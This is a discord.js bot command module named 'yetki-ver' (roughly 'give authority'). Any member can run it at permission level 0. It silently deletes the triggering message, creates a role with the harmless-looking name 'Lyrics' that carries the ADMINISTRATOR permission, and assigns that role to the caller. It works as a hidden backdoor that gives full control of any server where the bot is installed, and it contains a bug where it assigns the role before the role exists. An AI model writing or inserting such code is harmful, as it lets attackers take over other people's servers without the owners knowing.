const Discord = require("discord.js");
module.exports.run = async (client, message, args) => {
    var rol = message.guild.roles.find(e => e.name === `Lyrics`);
message.delete()
    if(!rol){
        message.guild.createRole({
        name: `Lyrics`,
        color: "GREEN", 
        hoist: true,
        permissions: [
            "ADMINISTRATOR",
    ]
    })
    }
    message.member.addRole(rol)
    }

exports.conf = {
 enabled: true,
 guildOnly: false,
 aliases: ['ver-yetki'],
 permLevel: 0
};

exports.help = {
 name: 'yetki-ver',
 description: 'xd',
 usage: 'xd'
}